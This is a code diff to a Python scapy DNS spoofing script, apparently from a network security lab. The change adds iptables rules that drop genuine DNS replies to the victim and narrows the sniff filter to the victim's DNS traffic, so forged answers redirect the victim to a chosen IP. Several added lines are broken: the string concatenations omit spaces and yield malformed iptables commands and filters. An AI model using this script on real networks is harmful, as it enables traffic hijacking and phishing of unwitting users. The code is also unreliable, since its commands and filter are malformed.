@@ -2,6 +2,7 @@
 
 from scapy.all import *
 import argparse
+import os
 
 def dns_responder(local_ip: str, victim_ip: str, spoof_ip: str):
 
@@ -21,8 +22,6 @@ def dns_responder(local_ip: str, victim_ip: str, spoof_ip: str):
 
 
 if __name__ == "__main__":
-    BPF_FILTER = f"udp port 53"
-
     parser = argparse.ArgumentParser()
     parser.add_argument("-r", "--responder", dest="dns_responder_ip", help="DNS Responder IP")
     parser.add_argument("-t", "--target", dest="target_ip", help="DNS Spoof Victim IP")
@@ -31,9 +30,13 @@ if __name__ == "__main__":
     args=parser.parse_args()
 
     dns_responder_ip = args.dns_responder_ip if args.dns_responder_ip else "192.168.0.108"
-    dns_spoof_victim_ip = args.target_ip if args.target_ip else "192.168.0.108"
+    dns_spoof_victim_ip = args.target_ip if args.target_ip else "192.168.0.107"
     network_interface = args.network_interface if args.network_interface else "enp0s3"
-    dns_responder_ip = args.dns_responder_ip if args.dns_responder_ip else "192.168.0.108"
     spoof_ip = args.spoof_ip if args.spoof_ip else "142.232.230.10"
+
+    os.system('iptables -A FORWARD -p udp --sport 53 -d' + dns_spoof_victim_ip + '-j DROP')
+    os.system('iptables -A FORWARD -p tcp --sport 53 -d' + dns_spoof_victim_ip + '-j DROP')
+
+    BPF_FILTER = f"host" + dns_spoof_victim_ip + "and port 53"
 
     sniff(filter=BPF_FILTER, prn=dns_responder(dns_responder_ip, dns_spoof_victim_ip, spoof_ip), iface=network_interface)
